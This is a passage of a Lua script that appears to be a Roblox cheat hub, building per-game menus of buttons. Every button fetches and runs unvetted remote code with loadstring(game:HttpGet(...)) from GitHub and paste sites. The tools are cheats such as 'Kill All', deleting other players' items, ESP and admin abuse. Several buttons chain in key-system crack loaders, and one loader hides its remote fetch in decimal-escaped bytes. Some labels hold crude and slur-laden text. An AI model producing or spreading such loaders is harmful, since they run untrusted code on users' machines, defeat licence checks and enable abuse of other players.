		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/FatRacer2831.lua"))()
  	end
})
elseif game.GameId==5719123726 then
	gametab=Window:CreateTab("Fastest Typer Race")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/TypeRaceSim1.lua"))()
  	end
})
elseif game.GameId==648454481 then
	gametab=Window:CreateTab("Grand Piece Online")
Button = gametab:CreateButton({
	Name = "Star Hub",
	Callback = function()
		loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/StarHub')()
  	end
})
Button = gametab:CreateButton({
	Name = "Fruit Notifier",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/ArponAG/Scripts/main/gpo.lua', true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Vamp HUB (Battleroyal only)",
	Callback = function()
		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ab1d247898645c7cf013913b8629963f.lua"))()
  	end
})
elseif game.GameId==5012222382 then
	gametab=Window:CreateTab("Gunfight Arena")
Button = gametab:CreateButton({
	Name = "BaconBoss Script",
	Callback = function()
		loadstring(game:HttpGet(('https://pastefy.app/FL5mxhtj/raw'),true))()
  	end
})
elseif game.GameId==5972059550 then
	gametab=Window:CreateTab("Gym League")
Button = gametab:CreateButton({
	Name = "Tupo Hub (Rayfield Lib)",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/x64communist/tupo/main/GymLeague.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Tupo Hub (Fluent Lib)",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/KeyRBLXCrack/main/Crack.lua"))()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenniel123/Gym-league-FluentLib/main/GymLeagueFluent"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Lightux Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/cool83birdcarfly02six/LightuxSolaraSup/main/README.md'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Speed Hub X",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Script-Games/main/Gym%20League.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "RYK Hub",
	Callback = function()
		loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/ryk')'xdddd²'
  	end
})
Button = gametab:CreateButton({
	Name = "Cats Hub",
	Callback = function()
		loadstring(game:HttpGet('https://gist.githubusercontent.com/afyzone/d8b7c8da9fb09c80937f4536648dbd9a/raw/'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Ather Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Athergaming/Roblox-Gym-League-Script/main/AtherHub%20Gym%20League%20V1_5.lua"))()
  	end
})
elseif game.GameId==1342991001 then
	gametab=Window:CreateTab("Giant Survival!")
Button = gametab:CreateButton({
	Name = "Inf XP & Money",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/F4vBL7yZ",true))()
  	end
})
elseif game.GameId==4447252800 then
	gametab=Window:CreateTab("Highway Hooligans")
Button = gametab:CreateButton({
	Name = "Auto Farm",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8643/test/main/hooligans", true))()
  	end
})
elseif game.GameId==6045016956 then
	gametab=Window:CreateTab("Horror RNG")
Button = gametab:CreateButton({
	Name = "Rinss Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/R1nn1/MainMenu1/main/MainMenuV1.2"))()
  	end
})
elseif game.GameId==8814491 then
	gametab=Window:CreateTab("Hotel Elphant")
Button = gametab:CreateButton({
	Name = "Inf Money",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ROBLOMACK/HotelElephantMoneyGiver/main/HEMG"))()
  	end
})
local Paragraph = gametab:CreateParagraph({Title = "REMINDER", Content = "YOU NEED TO FUCKING HIT ENTER AFTER TYPING IN PLAYER USERNAME OR AMOUNT thank you"})
elseif game.GameId==5607299070 then
	gametab=Window:CreateTab("IMPOSSIBLE OBBY")
Button = gametab:CreateButton({
	Name = "Auto Finish Game",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/IMPOSSIBLE/main/OBBY"))()
  	end
})
elseif game.GameId==245662005 then
	gametab=Window:CreateTab("Jail Break")
Section = gametab:CreateSection("If Callback Error then rejoin and execute")
Button = gametab:CreateButton({
    Name = "Aoi Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/zyn789/Aoi-Script/main/Jailbreak"))()
    end
})
Button = gametab:CreateButton({
    Name = "Ski Hub",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/paste/skihub.lua'))()
    end
})
Button = gametab:CreateButton({
    Name = "Jail Break V5",
    Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/ghGgrmWR'))()
    end
})
Button = gametab:CreateButton({
    Name = "Jail Break V2",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/Gd1H8cxf",true))()
     end
})
elseif game.GameId==5780359296 then
	gametab=Window:CreateTab("Jims RNG")
Button = gametab:CreateButton({
	Name = "Instant Get Any Aura",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/bims/main/rng",true))()
  	end
})
elseif game.GameId==3508322461 then
	gametab=Window:CreateTab("Jujutsu Shenanigans")
Button = gametab:CreateButton({
	Name = "NS Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/KeyRBLXCrack/main/Crack.lua"))()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/JJS/main/Solara"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Legends Hub",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/LOLking123456/Jujutsu/main/Shenanigans'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Fake animation Veux Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/LolnotaKid/Finallyworks/main/Protected.txt"))()
  	end
})
Button = gametab:CreateButton({
	Name = "ESP",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/R5bfAiMB",true))()
  	end
})
elseif game.GameId==5223708703 then
	gametab=Window:CreateTab("Kamehameha Simulator")
Button = gametab:CreateButton({
    Name = "Auto Farm (OP)",
    Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/paste/KamehamehaSimulator.lua'))()
    end,
})
elseif game.GameId==254394801 then
	gametab=Window:CreateTab("Kat")
Button = gametab:CreateButton({
	Name = "Lime X Hub",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/78kG7trR", true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Delete Other Players Item",
	Callback = function()
        loadstring(game:HttpGet(('https://pastebin.com/raw/6G9GfqjC'),true))()
  	end
})
 Button = gametab:CreateButton({
    Name = "Unnamed ESP",
    Callback = function()
        pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua'))() end)
    end,
})
elseif game.GameId==1451439645 then
	gametab=Window:CreateTab("King Legacy")
Button = gametab:CreateButton({
    Name = "Arc Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ChopLoris/ArcHub/main/PC.lua"))()
    end,
})
Button = gametab:CreateButton({
    Name = "Legend Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Upd6/main/King"))()
    end,
})
elseif game.GameId==5361859890 then
	gametab=Window:CreateTab("Launch Into Space Simulator")
Button = gametab:CreateButton({
	Name = "Kitty Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/myown/LaunchIntoSpaceSim.lua'))()
  	end
})
elseif game.GameId==1119466531 then
	gametab=Window:CreateTab("Legend Of Speed")
Button = gametab:CreateButton({
    Name = "Sim Hub",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/E1Kp2r3Y"))();
    end,
 })
Button = gametab:CreateButton({
    Name = "Blox Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/KeyRBLXCrack/main/Crack.lua"))()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ImPocky/PockyHub/main/Scripts/load.txt"))()
    end,
})
Button = gametab:CreateButton({
    Name = "Vynixius Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Legends%20Of%20Speed/Script.lua"))()
    end,
})
Button = gametab:CreateButton({
    Name = "Random Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/KrangH/ScriptsHub/main/Legends_Of_Speedv2"))()
    end,
})
elseif game.GameId==279565647 then
	gametab=Window:CreateTab("Lucky blocks")
 Button = gametab:CreateButton({
    Name = "LB Hub",
    Callback = function()
        loadstring(game:HttpGet("https://github.com/bruhhwtf/LUCKY-BLOCKS-Battlegrounds-GUI/raw/main/Main"))()
    end,
})
elseif game.GameId==2471084 then
	gametab=Window:CreateTab("")
Button = gametab:CreateButton({
	Name = "James Hub",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/dDDrAaN6"))()
  	end
})
Button = gametab:CreateButton({
	Name = "LuaWare V5.0",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/yn0UgQhV"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Butter Hub",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/Butter/main/Root2.lua'))("")
  	end
})
elseif game.GameId==2626227051 then
	gametab=Window:CreateTab("Mic Up")
Button = gametab:CreateButton({
	Name = "Kitty Hub",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/myown/micup.lua'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Sky Hub",
	Callback = function()
        loadstring(game:HttpGet("https://scriptblox.com/raw/3008-2.73-teleport-to-player-worker-esp-grab-food-no-fall-damage-12949"))()
  	end
})
elseif game.GameId==5988250208 then
	gametab=Window:CreateTab("Monkey Raft")
Button = gametab:CreateButton({
	Name = "Auto Collect Items ( Go near islands )",
	Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/16e4cdEo/raw",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Auto Collect Gold Banana's",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/YS5x5C5z",true))()
  	end
})
elseif game.GameId==66654135 then
	gametab=Window:CreateTab("Murder Mystery 2")
Paragraph = gametab:CreateParagraph({Title = "USE ALT ACC TO TEST SCRIPT FIRST.", Content = "I Do not own any of these mm2 scripts i only add them after testing"})
Button = gametab:CreateButton({
	Name = "Ski Hub",
	Callback = function()
		loadstring(game:HttpGet(("https://raw.githubusercontent.com/Yousuck780/mm2/main/mm2"), true))()
	end,
 })
Button = gametab:CreateButton({
	Name = "Vynixu's Hub",
	Callback = function()
        loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
  	end
})
Button = gametab:CreateButton({
	Name = "Yarhm Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", false))()
  	end
})
Button = gametab:CreateButton({
	Name = "HaxHell Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/haxhell/roblox-scripts/main/murder-mystery-2.lua", true))()
	end,
 })
Button = gametab:CreateButton({
	Name = "Foggy hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/FOGOTY/mm2-foggy/main/script"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Meow Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/testikwatafak/-ProstoHub/main/ProstoHub", true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Mars Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/1andonlymars/MarsHub/main/MM2"))()
  	end
})
elseif game.GameId==4348829796 then
	gametab=Window:CreateTab("Murderers VS Sheriffs Duels")
Button = gametab:CreateButton({
    Name = "Random Hub (Have hitbox too)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/Murderer-Vs-Sheriff-Duels-/main/Murderer%20Vs%20Sheriff%20Duels"))()
    end,
})
Button = gametab:CreateButton({
    Name = "Hitbox",
    Callback = function()
        loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Update-script-hitbox-9326"))()
    end,
})
Button = gametab:CreateButton({
    Name = "Random Hub V2",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/4MvbLUwi",true))()
    end,
})
Button = gametab:CreateButton({
    Name = "Random Hub (Best Script)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Sheeshablee73/Scriptss/main/MVSD.lua",true))()
    end,
})
elseif game.GameId==1268927906 then
	gametab=Window:CreateTab("Muscle Legends")
Button = gametab:CreateButton({
    Name = "Unique Hub",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Unique-Hub-(14-Gmes)_521",true))()
    end,
})
Button = gametab:CreateButton({
    Name = "Neko Hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/muscle/main/hub"))()
    end,
})
Button = gametab:CreateButton({
    Name = "Auto Farm ( Might take time to load )",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/paste/badmusclelegends.lua'))()
    end,
})
elseif game.GameId==6139437092 then
	gametab=Window:CreateTab("Mining empire")
Button = gametab:CreateButton({
    Name = "Wack hub",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Janorax/MinerEmpire/main/mainer"))()
    end,
})
elseif game.GameId==65241 then
	gametab=Window:CreateTab("Natural Disaster Survival")
Button = gametab:CreateButton({
	Name = "Rawnder Hub",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/LiverMods/Rawnder-NTDR/main/NaturalDisaster'))()
  	end
})
Button = gametab:CreateButton({
	Name = "NDS Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAP1ayer/PlayerHubOther/main/PlayerHubLoader.lua",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Nut Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/Nds/main/script"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Different Walk Animation (R6)",
	Callback = function()
        game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=376760331"
  	end
})
Button = gametab:CreateButton({
	Name = "incognito Bypass (U can type anything)",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/S4skyvLa"))()
      	end
})
Button = gametab:CreateButton({
	Name = "CH Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxHackingProject/CHHub/main/CHHub.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Tbao Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubNaturalDisasterSurvival"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Sp4m Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/HSp4m/rbx-scr.wtf/main/loader.brainfuck", true))()
  	end
})
elseif game.GameId==1335695570 then
	gametab=Window:CreateTab("Ninja Legends")
Button = gametab:CreateButton({
	Name = "Ski Hub",
	Callback = function()
        loadstring(game:HttpGet(("https://raw.githubusercontent.com/Yousuck780/ninja-legends/main/no"), true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Vynixius Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Ninja%20Legends/Script.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Zepsyy Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Zepsyy2/asd/main/Ninja%20Legends.lua"))()
  	end
})
elseif game.GameId==4295108146 then
	gametab=Window:CreateTab("Pancake Battles")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/PancakeBattles9942.lua"))()
  	end
})
elseif game.GameId==3317771874 then
	gametab=Window:CreateTab("Pet Simulator 99")
Button = gametab:CreateButton({
	Name = "Griffin Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/paste/ps99noq.lua'))()
	end,
 })
 Button = gametab:CreateButton({
	Name = "Redz Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua'))()
	end,
 })
elseif game.GameId==113491250 then
	gametab=Window:CreateTab("Phantom Forces")
Label = gametab:CreateLabel("DeleteMob, ThunderClient & HomoHack discontinued")
Button = gametab:CreateButton({
	Name = "Ski Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Yousuck780/phantom-forces-new/main/noob"))()
  	end
})
elseif game.GameId==73885730 then
	gametab=Window:CreateTab("Prison Life")
Button = gametab:CreateButton({
	Name = "FE Bypass Gui",
	Callback = function()
        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
  	end
})
Button = gametab:CreateButton({
	Name = "Prison Ware Hub",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Nihilize H4X",
	Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/QLtH2v8i'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Admin Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Juanko-Scripts/Roblox-scripts/main/Prision%20Admin%20Hub%20irufwjskwidiuxejw8uddjjwjdnnwjwjdbb"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Trigger Admin",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/triger/main/admin"))()
  	end
})
Button = gametab:CreateButton({
	Name = "PrizzLife Admin",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/elliexmln/PrizzLife/main/pladmin.lua'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Anti-Abuser Hub",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/kmWxeu8P",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "LGBTQ+ Hub (Kill All)",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/a0Bxk3sn",true))()
  	end
})
elseif game.GameId==2142948266 then
	gametab=Window:CreateTab("Project Slayers ")
Button = gametab:CreateButton({
	Name = "Cloud Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/cloudman4416/scripts/main/Loader"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Blindness Hub Map 1",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/washingtontrichkid2/Newgay/main/ProjectSlayer",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Blindness Hub Map 2",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/washingtontrichkid2/Newgay/main/ProjectSlayerMap2",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Shark Hub",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/YUJUBz0Z",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Frost Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/Scripts/main/ProjectSlayers/Script.lua"))();
  	end
})
local Label = gametab:CreateLabel("Frost Hub Key : FrostiesOnTop")
elseif game.GameId==4795326392 then
	gametab=Window:CreateTab("Pull A Sword")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/PullASword3421.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Esohasl Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/itsnoctural/Utilities/main/Closed/Pull%20a%20Sword.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Random Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/PaS"))()
  	end
})
elseif game.GameId==5243717044 then
	gametab=Window:CreateTab("Push Up Battles")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/PushUpBattles932.lua"))()
  	end
})
elseif game.GameId==5704018616 then
	gametab=Window:CreateTab("Pet Hatchers")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/PetHatcher.lua"))()
  	end
})
elseif game.GameId==6217832823 then
	gametab=Window:CreateTab("Push-Up Training Simulator")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/PushUpTrainingSimulator.lua"))()
  	end
})
elseif game.GameId==3476371299 then
	gametab=Window:CreateTab("Race Clicker")
Button = gametab:CreateButton({
	Name = "Auto Farm",
	Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/c2gAKZU3'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Kitty Hub",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/paste/raceclicker.lua'))()
  	end
})
elseif game.GameId==3258302407 then
	gametab=Window:CreateTab("Rebirth Champions X")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/RebirthChampionsX1837.lua"))()
  	end
})
elseif game.GameId==5827120940 then
	gametab=Window:CreateTab("Reborn As Swordman")
Button = gametab:CreateButton({
	Name = "Ywxos Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/RebornAsSwordman34.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "DK Hub",
	Callback = function()
		loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/dkhub')'you should suck frosts dick'
  	end
})
elseif game.GameId==6035872082 then
	gametab=Window:CreateTab("Rivals")
Button = gametab:CreateButton({
	Name = "Drowned Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FrostLua/Krakles/main/DrownedHub/Rival.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Jonny Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/JonnyCheeser/script/main/hub",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Op Gui",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Baillee/Rivals-script/main/Rivals-script.lua", true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Silent Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/KxGOATESQUE/SilentRivals/main/SilentRivals"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Venox Ware",
	Callback = function()
		loadstring(game:HttpGet(("https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/venoxrivals")))()
  	end
})
Button = gametab:CreateButton({
	Name = "Venox Ware V2",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/venoxrivalsv2'))()
  	end
})
local Label = gametab:CreateLabel("Join Nut Hub To Bypass Key system")
elseif game.GameId==380704901 then
gametab=Window:CreateTab("Ro Ghoul")
Button = gametab:CreateButton({
	Name = "Zen Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/ZenHub/main/Roghoul", true))()
  	end
})
elseif game.GameId==4933844472 then
gametab=Window:CreateTab("Running Simulator")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/Retarded_German/main/RunningSim.lua"))()
  	end
})
elseif game.GameId==5931070224 then
	gametab=Window:CreateTab("Saber Battle Simulator")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/SaberBattleSim2841.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Nut Hub (Auto Click and fight only)",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/75GYs0rx",true))()
  	end
})
elseif game.GameId==5998308727 then
	gametab=Window:CreateTab("Scythe Simulator")
Button = gametab:CreateButton({
	Name = "Random Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/scythe/main/Sim"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Nami Hub",
	Callback = function()
		loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/dkhub')'you should suck frosts dick'
  	end
})
elseif game.GameId==2380077519 then
	gametab=Window:CreateTab("Slap Battle")
local Label = gametab:CreateLabel("Rejoin and execute if any script show callback error")
Button = gametab:CreateButton({
	Name = "Zenon Hub",
	Callback = function()
        setclipboard("Zenon12345")
		loadstring(game:HttpGet("https://pastefy.app/gbwEzNX4/raw"))()
  	end
})
Button = gametab:CreateButton({
	Name = "SB Hub",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/9c5vWtYw",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Giang Hub",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/AR5f1MT5",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Dizzy Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/slap/main/dizzyhub",true))()
  	end
})
Button = gametab:CreateButton({
	Name = "Random Hub",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/UABerT22",true))()
  	end
})
elseif game.GameId==4912354124 then
	gametab=Window:CreateTab("Slayer Corps")
Button = gametab:CreateButton({
	Name = "DK Hub",
	Callback = function()
		loadstring(game:HttpGet'https://raw.githubusercontent.com/cracklua/cracks/m/dkhub')'you should suck frosts dick'
  	end
})
elseif game.GameId==5361032378 then
	gametab=Window:CreateTab("Sol's RNG")
Button = gametab:CreateButton({
	Name = "Erudite Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ThacG/EruditeHub/main/Sol's%20RNG/V2.69"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Legends Hub (Copies Key)",
	Callback = function()
		setclipboard("vy5fBGS6nNUuJjgxWhCLpR")
		loadstring(game:HttpGet('https://pastefy.app/55pnwOy3/raw'))()
  	end
})
Button = gametab:CreateButton({
	Name = "3itx Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Just3itx/Backup/main/loader.lua"))()
  	end
})
Button = gametab:CreateButton({
	Name = "Bacon Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBossScript/SolRNG/main/SolRNG"))()
  	end
})
elseif game.GameId==3171190217 then
	gametab=Window:CreateTab("Specter")
Button = gametab:CreateButton({
	Name = "Kitty Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/myown/specter1.lua'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Navicat Hub",
	Callback = function()
		loadstring(game:HttpGet('https://navicat.glitch.me/Specter/script.lua'))()
  	end
})
elseif game.GameId==3367801828 then
	gametab=Window:CreateTab("Starving Artists")
Button = gametab:CreateButton({
	Name = "Auto Draw First Sit. (Copies Key)",
	Callback = function()
		setclipboard("usernaxo")
		loadstring(game:HttpGet("https://github.com/usernaxo/RobloxScripts/raw/main/StarvingArtists/DrawingScript.lua", true))()
  	end
})
elseif game.GameId==1489026993 then
	gametab=Window:CreateTab("Survive the Killer!")
Button = gametab:CreateButton({
	Name = "Turtle Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/benomat/scripts/m/paste/STKTurtle.lua'))()
  	end
})
Button = gametab:CreateButton({
	Name = "Ywxo Hub (The Game Event Only)",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/ProjectpopCat/YS_TheGamesEvent/main/SurviveTheKiller.lua'))()
  	end
})
elseif game.GameId==5349025481 then
gametab=Window:CreateTab("Swordmaster Simulator")
Button = gametab:CreateButton({
	Name = "Ywxo Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ProjectpopCat/ywxoscripts/main/CFS.lua"))()
  	end
})
